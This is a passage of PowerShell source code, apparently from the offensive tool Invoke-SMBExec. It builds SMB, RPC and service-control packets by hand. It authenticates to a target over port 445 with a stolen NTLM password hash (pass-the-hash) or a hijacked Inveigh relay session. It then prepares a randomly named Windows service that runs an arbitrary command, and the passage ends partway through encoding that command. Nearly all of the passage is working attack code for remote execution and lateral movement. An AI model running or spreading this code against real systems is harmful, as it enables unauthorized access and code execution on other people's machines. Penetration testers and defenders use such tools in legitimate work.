    $RPCBind.Add("Unknown",[Byte[]](0x00,0x00,0x00))
    $RPCBind.Add("ContextID",$ContextID)
    $RPCBind.Add("NumTransItems",[Byte[]](0x01))
    $RPCBind.Add("Unknown2",[Byte[]](0x00))
    $RPCBind.Add("Interface",$UUID)
    $RPCBind.Add("InterfaceVer",$UUIDVersion)
    $RPCBind.Add("InterfaceVerMinor",[Byte[]](0x00,0x00))
    $RPCBind.Add("TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
    $RPCBind.Add("TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))

    if($NumCtxItems[0] -eq 2)
    {
        $RPCBind.Add("ContextID2",[Byte[]](0x01,0x00))
        $RPCBind.Add("NumTransItems2",[Byte[]](0x01))
        $RPCBind.Add("Unknown3",[Byte[]](0x00))
        $RPCBind.Add("Interface2",$UUID)
        $RPCBind.Add("InterfaceVer2",$UUIDVersion)
        $RPCBind.Add("InterfaceVerMinor2",[Byte[]](0x00,0x00))
        $RPCBind.Add("TransferSyntax2",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $RPCBind.Add("TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
    }
    elseif($NumCtxItems[0] -eq 3)
    {
        $RPCBind.Add("ContextID2",[Byte[]](0x01,0x00))
        $RPCBind.Add("NumTransItems2",[Byte[]](0x01))
        $RPCBind.Add("Unknown3",[Byte[]](0x00))
        $RPCBind.Add("Interface2",$UUID)
        $RPCBind.Add("InterfaceVer2",$UUIDVersion)
        $RPCBind.Add("InterfaceVerMinor2",[Byte[]](0x00,0x00))
        $RPCBind.Add("TransferSyntax2",[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
        $RPCBind.Add("TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
        $RPCBind.Add("ContextID3",[Byte[]](0x02,0x00))
        $RPCBind.Add("NumTransItems3",[Byte[]](0x01))
        $RPCBind.Add("Unknown4",[Byte[]](0x00))
        $RPCBind.Add("Interface3",$UUID)
        $RPCBind.Add("InterfaceVer3",$UUIDVersion)
        $RPCBind.Add("InterfaceVerMinor3",[Byte[]](0x00,0x00))
        $RPCBind.Add("TransferSyntax3",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $RPCBind.Add("TransferSyntaxVer3",[Byte[]](0x01,0x00,0x00,0x00))
    }

    if($call_ID -eq 3)
    {
        $RPCBind.Add("AuthType",[Byte[]](0x0a))
        $RPCBind.Add("AuthLevel",[Byte[]](0x02))
        $RPCBind.Add("AuthPadLength",[Byte[]](0x00))
        $RPCBind.Add("AuthReserved",[Byte[]](0x00))
        $RPCBind.Add("ContextID3",[Byte[]](0x00,0x00,0x00,0x00))
        $RPCBind.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        $RPCBind.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
        $RPCBind.Add("NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
        $RPCBind.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $RPCBind.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $RPCBind.Add("OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
    }

    return $RPCBind
}

function New-PacketRPCRequest
{
    param([Byte[]]$Flags,[Int]$ServiceLength,[Int]$AuthLength,[Int]$AuthPadding,[Byte[]]$CallID,[Byte[]]$ContextID,[Byte[]]$Opnum,[Byte[]]$Data)

    if($AuthLength -gt 0)
    {
        $full_auth_length = $AuthLength + $AuthPadding + 8
    }

    [Byte[]]$write_length = [System.BitConverter]::GetBytes($ServiceLength + 24 + $full_auth_length + $Data.Length)
    [Byte[]]$frag_length = $write_length[0,1]
    [Byte[]]$alloc_hint = [System.BitConverter]::GetBytes($ServiceLength + $Data.Length)
    [Byte[]]$auth_length = ([System.BitConverter]::GetBytes($AuthLength))[0,1]

    $RPCRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $RPCRequest.Add("Version",[Byte[]](0x05))
    $RPCRequest.Add("VersionMinor",[Byte[]](0x00))
    $RPCRequest.Add("PacketType",[Byte[]](0x00))
    $RPCRequest.Add("PacketFlags",$Flags)
    $RPCRequest.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $RPCRequest.Add("FragLength",$frag_length)
    $RPCRequest.Add("AuthLength",$auth_length)
    $RPCRequest.Add("CallID",$CallID)
    $RPCRequest.Add("AllocHint",$alloc_hint)
    $RPCRequest.Add("ContextID",$ContextID)
    $RPCRequest.Add("Opnum",$Opnum)

    if($data.Length)
    {
        $RPCRequest.Add("Data",$Data)
    }

    return $RPCRequest
}

#SCM

function New-PacketSCMOpenSCManagerW
{
    param ([Byte[]]$packet_service,[Byte[]]$packet_service_length)

    $packet_referent_ID1 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
    $packet_referent_ID1 = $packet_referent_ID1.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
    $packet_referent_ID1 += 0x00,0x00
    $packet_referent_ID2 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
    $packet_referent_ID2 = $packet_referent_ID2.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
    $packet_referent_ID2 += 0x00,0x00

    $packet_SCMOpenSCManagerW = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SCMOpenSCManagerW.Add("MachineName_ReferentID",$packet_referent_ID1)
    $packet_SCMOpenSCManagerW.Add("MachineName_MaxCount",$packet_service_length)
    $packet_SCMOpenSCManagerW.Add("MachineName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMOpenSCManagerW.Add("MachineName_ActualCount",$packet_service_length)
    $packet_SCMOpenSCManagerW.Add("MachineName",$packet_service)
    $packet_SCMOpenSCManagerW.Add("Database_ReferentID",$packet_referent_ID2)
    $packet_SCMOpenSCManagerW.Add("Database_NameMaxCount",[Byte[]](0x0f,0x00,0x00,0x00))
    $packet_SCMOpenSCManagerW.Add("Database_NameOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SCMOpenSCManagerW.Add("Database_NameActualCount",[Byte[]](0x0f,0x00,0x00,0x00))
    $packet_SCMOpenSCManagerW.Add("Database",[Byte[]](0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x41,0x00,0x63,0x00,0x74,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x00,0x00))
    $packet_SCMOpenSCManagerW.Add("Unknown",[Byte[]](0xbf,0xbf))
    $packet_SCMOpenSCManagerW.Add("AccessMask",[Byte[]](0x3f,0x00,0x00,0x00))
    
    return $packet_SCMOpenSCManagerW
}

function New-PacketSCMCreateServiceW
{
    param([Byte[]]$ContextHandle,[Byte[]]$Service,[Byte[]]$ServiceLength,[Byte[]]$Command,[Byte[]]$CommandLength)
                
    $referent_ID = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
    $referent_ID = $referent_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
    $referent_ID += 0x00,0x00

    $SCMCreateServiceW = New-Object System.Collections.Specialized.OrderedDictionary
    $SCMCreateServiceW.Add("ContextHandle",$ContextHandle)
    $SCMCreateServiceW.Add("ServiceName_MaxCount",$ServiceLength)
    $SCMCreateServiceW.Add("ServiceName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("ServiceName_ActualCount",$ServiceLength)
    $SCMCreateServiceW.Add("ServiceName",$Service)
    $SCMCreateServiceW.Add("DisplayName_ReferentID",$referent_ID)
    $SCMCreateServiceW.Add("DisplayName_MaxCount",$ServiceLength)
    $SCMCreateServiceW.Add("DisplayName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("DisplayName_ActualCount",$ServiceLength)
    $SCMCreateServiceW.Add("DisplayName",$Service)
    $SCMCreateServiceW.Add("AccessMask",[Byte[]](0xff,0x01,0x0f,0x00))
    $SCMCreateServiceW.Add("ServiceType",[Byte[]](0x10,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("ServiceStartType",[Byte[]](0x03,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("ServiceErrorControl",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("BinaryPathName_MaxCount",$CommandLength)
    $SCMCreateServiceW.Add("BinaryPathName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("BinaryPathName_ActualCount",$CommandLength)
    $SCMCreateServiceW.Add("BinaryPathName",$Command)
    $SCMCreateServiceW.Add("NULLPointer",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("TagID",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("NULLPointer2",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("DependSize",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("NULLPointer3",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("NULLPointer4",[Byte[]](0x00,0x00,0x00,0x00))
    $SCMCreateServiceW.Add("PasswordSize",[Byte[]](0x00,0x00,0x00,0x00))

    return $SCMCreateServiceW
}

function New-PacketSCMStartServiceW
{
    param([Byte[]]$ContextHandle)

    $SCMStartServiceW = New-Object System.Collections.Specialized.OrderedDictionary
    $SCMStartServiceW.Add("ContextHandle",$ContextHandle)
    $SCMStartServiceW.Add("Unknown",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return $SCMStartServiceW
}

function New-PacketSCMDeleteServiceW
{
    param([Byte[]]$ContextHandle)

    $SCMDeleteServiceW = New-Object System.Collections.Specialized.OrderedDictionary
    $SCMDeleteServiceW.Add("ContextHandle",$ContextHandle)

    return $SCMDeleteServiceW
}

function New-PacketSCMCloseServiceHandle
{
    param([Byte[]]$ContextHandle)

    $SCM_CloseServiceW = New-Object System.Collections.Specialized.OrderedDictionary
    $SCM_CloseServiceW.Add("ContextHandle",$ContextHandle)

    return $SCM_CloseServiceW
}

function Get-StatusPending
{
    param ([Byte[]]$Status)

    if([System.BitConverter]::ToString($Status) -eq '03-01-00-00')
    {
        $status_pending = $true
    }

    return $status_pending
}

function Get-UInt16DataLength
{
    param ([Int]$Start,[Byte[]]$Data)

    $data_length = [System.BitConverter]::ToUInt16($Data[$Start..($Start + 1)],0)

    return $data_length
}

if($hash -like "*:*")
{
    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)
}

if($Domain)
{
    $output_username = $Domain + "\" + $Username
}
else
{
    $output_username = $Username
}

if($PSBoundParameters.ContainsKey('Session'))
{
    $inveigh_session = $true
}

if($PSBoundParameters.ContainsKey('Session'))
{

    if(!$Inveigh)
    {
        Write-Output "[-] Inveigh Relay session not found"
        $startup_error = $true
    }
    elseif(!$inveigh.session_socket_table[$session].Connected)
    {
        Write-Output "[-] Inveigh Relay session not connected"
        $startup_error = $true
    }

    $Target = $inveigh.session_socket_table[$session].Client.RemoteEndpoint.Address.IPaddressToString
}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
$process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
[Byte[]]$process_ID = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

if(!$inveigh_session)
{
    $client = New-Object System.Net.Sockets.TCPClient
    $client.Client.ReceiveTimeout = 60000
}

if(!$startup_error -and !$inveigh_session)
{

    try
    {
        $client.Connect($Target,"445")
    }
    catch
    {
        Write-Output "[-] $Target did not respond"
    }

}

if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$session].Connected))
{
    $client_receive = New-Object System.Byte[] 1024

    if(!$inveigh_session)
    {
        $client_stream = $client.GetStream()

        if($SMB_version -eq 'SMB2.1')
        {
            $stage = 'NegotiateSMB2'
        }
        else
        {
            $stage = 'NegotiateSMB'
        }

        while($stage -ne 'Exit')
        {

            try
            {

                switch ($stage)
                {

                    'NegotiateSMB'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $process_ID 0x00,0x00
                        $packet_SMB_data = New-PacketSMBNegotiateProtocolRequest $SMB_version
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        try
                        {    
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                            if([System.BitConverter]::ToString($client_receive[4..7]) -eq 'ff-53-4d-42')
                            {
                                $SMB_version = 'SMB1'
                                $stage = 'NTLMSSPNegotiate'

                                if([System.BitConverter]::ToString($client_receive[39]) -eq '0f')
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is required on $target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {
                                        Write-Verbose "[+] SMB signing is required"
                                        $SMB_signing = $true
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x15,0x82,0x08,0xa0
                                    }

                                }
                                else
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is not required on $target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {
                                        $SMB_signing = $false
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x05,0x82,0x08,0xa0
                                    }

                                }

                            }
                            else
                            {
                                $stage = 'NegotiateSMB2'

                                if([System.BitConverter]::ToString($client_receive[70]) -eq '03')
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is required on $target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {

                                        if($signing_check)
                                        {
                                            Write-Verbose "[+] SMB signing is required"
                                        }

                                        $SMB_signing = $true
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x15,0x82,0x08,0xa0
                                    }

                                }
                                else
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is not required on $target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {
                                        $SMB_signing = $false
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x05,0x80,0x08,0xa0
                                    }

                                }

                            }

                        }
                        catch
                        {

                            if($_.Exception.Message -like 'Exception calling "Read" with "3" argument(s): "Unable to read data from the transport connection: An existing connection was forcibly closed by the remote host."')
                            {
                                Write-Output "[-] SMB1 negotiation failed"
                                $negoitiation_failed = $true
                                $stage = 'Exit'
                            }

                        }

                    }

                    'NegotiateSMB2'
                    {

                        if($SMB_version -eq 'SMB2.1')
                        {
                            $message_ID = 0
                        }
                        else
                        {
                            $message_ID = 1
                        }

                        $tree_ID = 0x00,0x00,0x00,0x00
                        $session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                        $packet_SMB2_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 $false $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2NegotiateProtocolRequest
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'NTLMSSPNegotiate'

                        if([System.BitConverter]::ToString($client_receive[70]) -eq '03')
                        {

                            if($signing_check)
                            {
                                Write-Output "[+] SMB signing is required on $target"
                                $stage = 'Exit'
                            }
                            else
                            {

                                if($signing_check)
                                {
                                    Write-Verbose "[+] SMB signing is required"
                                }

                                $SMB_signing = $true
                                $session_key_length = 0x00,0x00
                                $negotiate_flags = 0x15,0x82,0x08,0xa0
                            }

                        }
                        else
                        {

                            if($signing_check)
                            {
                                Write-Output "[+] SMB signing is not required on $target"
                                $stage = 'Exit'
                            }
                            else
                            {
                                $SMB_signing = $false
                                $session_key_length = 0x00,0x00
                                $negotiate_flags = 0x05,0x80,0x08,0xa0
                            }

                        }

                    }

                    'NTLMSSPNegotiate'
                    {

                        if($SMB_version -eq 'SMB1')
                        {
                            $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID 0x00,0x00

                            if($SMB_signing)
                            {
                                $packet_SMB_header["Flags2"] = 0x05,0x48
                            }

                            $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                            $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        }
                        else
                        {
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 $false $message_ID $process_ID $tree_ID $session_ID
                            $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                            $packet_SMB2_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_negotiate
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        }

                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()    
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'Exit'
                    }
                    
                }

            }
            catch
            {
                Write-Output "[-] $($_.Exception.Message)"
                $negoitiation_failed = $true
            }

        }

        if(!$signing_check -and !$negoitiation_failed)
        {
            $NTLMSSP = [System.BitConverter]::ToString($client_receive)
            $NTLMSSP = $NTLMSSP -replace "-",""
            $NTLMSSP_index = $NTLMSSP.IndexOf("4E544C4D53535000")
            $NTLMSSP_bytes_index = $NTLMSSP_index / 2
            $domain_length = Get-UInt16DataLength ($NTLMSSP_bytes_index + 12) $client_receive
            $target_length = Get-UInt16DataLength ($NTLMSSP_bytes_index + 40) $client_receive
            $session_ID = $client_receive[44..51]
            $NTLM_challenge = $client_receive[($NTLMSSP_bytes_index + 24)..($NTLMSSP_bytes_index + 31)]
            $target_details = $client_receive[($NTLMSSP_bytes_index + 56 + $domain_length)..($NTLMSSP_bytes_index + 55 + $domain_length + $target_length)]
            $target_time_bytes = $target_details[($target_details.Length - 12)..($target_details.Length - 5)]
            $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"
            $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $auth_hostname = (Get-ChildItem -path env:computername).Value
            $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
            $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($Domain)
            $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
            $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)[0,1]
            $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)[0,1]
            $auth_domain_offset = 0x40,0x00,0x00,0x00
            $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
            $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
            $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)
            $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)
            $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5
            $HMAC_MD5.key = $NTLM_hash_bytes
            $username_and_target = $username.ToUpper()
            $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)
            $username_and_target_bytes += $auth_domain_bytes
            $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
            $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

            $security_blob_bytes = 0x01,0x01,0x00,0x00,
                                    0x00,0x00,0x00,0x00 +
                                    $target_time_bytes +
                                    $client_challenge_bytes +
                                    0x00,0x00,0x00,0x00 +
                                    $target_details +
                                    0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00

            $server_challenge_and_security_blob_bytes = $NTLM_challenge + $security_blob_bytes
            $HMAC_MD5.key = $NTLMv2_hash
            $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)

            if($SMB_signing)
            {
                $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)
                $session_key = $session_base_key
                $HMAC_SHA256 = New-Object System.Security.Cryptography.HMACSHA256
                $HMAC_SHA256.key = $session_key
            }

            $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
            $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)[0,1]
            $session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)

            $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                    0x03,0x00,0x00,0x00,
                                    0x18,0x00,
                                    0x18,0x00 +
                                    $auth_LM_offset +
                                    $NTLMv2_response_length +
                                    $NTLMv2_response_length +
                                    $auth_NTLM_offset +
                                    $auth_domain_length +
                                    $auth_domain_length +
                                    $auth_domain_offset +
                                    $auth_username_length +
                                    $auth_username_length +
                                    $auth_username_offset +
                                    $auth_hostname_length +
                                    $auth_hostname_length +
                                    $auth_hostname_offset +
                                    $session_key_length +
                                    $session_key_length +
                                    $session_key_offset +
                                    $negotiate_flags +
                                    $auth_domain_bytes +
                                    $auth_username_bytes +
                                    $auth_hostname_bytes +
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                    $NTLMv2_response

            if($SMB_version -eq 'SMB1')
            {
                $SMB_user_ID = $client_receive[32,33]
                $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID $SMB_user_ID

                if($SMB_signing)
                {
                    $packet_SMB_header["Flags2"] = 0x05,0x48
                }

                $packet_SMB_header["UserID"] = $SMB_user_ID
                $packet_NTLMSSP_negotiate = New-PacketNTLMSSPAuth $NTLMSSP_response
                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate      
                $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
            }
            else
            {
                $message_ID++
                $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x01,0x00 $false $message_ID  $process_ID $tree_ID $session_ID
                $packet_NTLMSSP_auth = New-PacketNTLMSSPAuth $NTLMSSP_response
                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth        
                $packet_SMB2_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_auth
                $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
            }

            try
            {
                $client_stream.Write($client_send,0,$client_send.Length) > $null
                $client_stream.Flush()
                $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                if($SMB_version -eq 'SMB1')
                {

                    if([System.BitConverter]::ToString($client_receive[9..12]) -eq '00-00-00-00')
                    {
                        Write-Verbose "[+] $output_username successfully authenticated on $Target"
                        $login_successful = $true
                    }
                    else
                    {
                        Write-Output "[!] $output_username failed to authenticate on $Target"
                        $login_successful = $false
                    }

                }
                else
                {
                    if([System.BitConverter]::ToString($client_receive[12..15]) -eq '00-00-00-00')
                    {
                        Write-Verbose "[+] $output_username successfully authenticated on $Target"
                        $login_successful = $true
                    }
                    else
                    {
                        Write-Output "[!] $output_username failed to authenticate on $Target"
                        $login_successful = $false
                    }

                }

            }
            catch
            {
                Write-Output "[-] $($_.Exception.Message)"
            }

        }

    }

    if($login_successful -or $inveigh_session)
    {

        if($inveigh_session)
        {

            if($inveigh_session -and $inveigh.session_lock_table[$session] -eq 'locked')
            {
                Write-Output "[*] Pausing due to Inveigh Relay session lock"
                Start-Sleep -s 2
            }

            $inveigh.session_lock_table[$session] = 'locked'
            $client = $inveigh.session_socket_table[$session]
            $client_stream = $client.GetStream()
            $session_ID = $inveigh.session_table[$session]
            $message_ID =  $inveigh.session_message_ID_table[$session]
            $tree_ID = 0x00,0x00,0x00,0x00
            $SMB_signing = $false
        }

        $SMB_path = "\\" + $Target + "\IPC$"

        if($SMB_version -eq 'SMB1')
        {
            $SMB_path_bytes = [System.Text.Encoding]::UTF8.GetBytes($SMB_path) + 0x00
        }
        else
        {
            $SMB_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_path)
        }

        $named_pipe_UUID = 0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,0x00,0x10,0x03

        if(!$Service)
        {
            $SMB_service_random = [String]::Join("00-",(1..20 | ForEach-Object{"{0:X2}-" -f (Get-Random -Minimum 65 -Maximum 90)}))
            $SMB_service = $SMB_service_random -replace "-00",""
            $SMB_service = $SMB_service.Substring(0,$SMB_service.Length - 1)
            $SMB_service = $SMB_service.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $SMB_service = New-Object System.String ($SMB_service,0,$SMB_service.Length)
            $SMB_service_random += '00-00-00-00-00'
            $SMB_service_bytes = $SMB_service_random.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }
        else
        {
            $SMB_service = $Service
            $SMB_service_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_service)

            if([Bool]($SMB_service.Length % 2))
            {
                $SMB_service_bytes += 0x00,0x00
            }
            else
            {
                $SMB_service_bytes += 0x00,0x00,0x00,0x00
                
            }

        }
        
        $SMB_service_length = [System.BitConverter]::GetBytes($SMB_service.Length + 1)

        if($CommandCOMSPEC -eq 'Y')
        {
            $Command = "%COMSPEC% /C `"" + $Command + "`""
        }
        else
        {
            $Command = "`"" + $Command + "`""
        }

        [System.Text.Encoding]::UTF8.GetBytes($Command) | ForEach-Object{$SMBExec_command += "{0:X2}-00-" -f $_}

        if([Bool]($Command.Length % 2))
        {
            $SMBExec_command += '00-00'
        }
        else
        {
            $SMBExec_command += '00-00-00-00'
        }    
        
        $SMBExec_command_bytes = $SMBExec_command.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}  
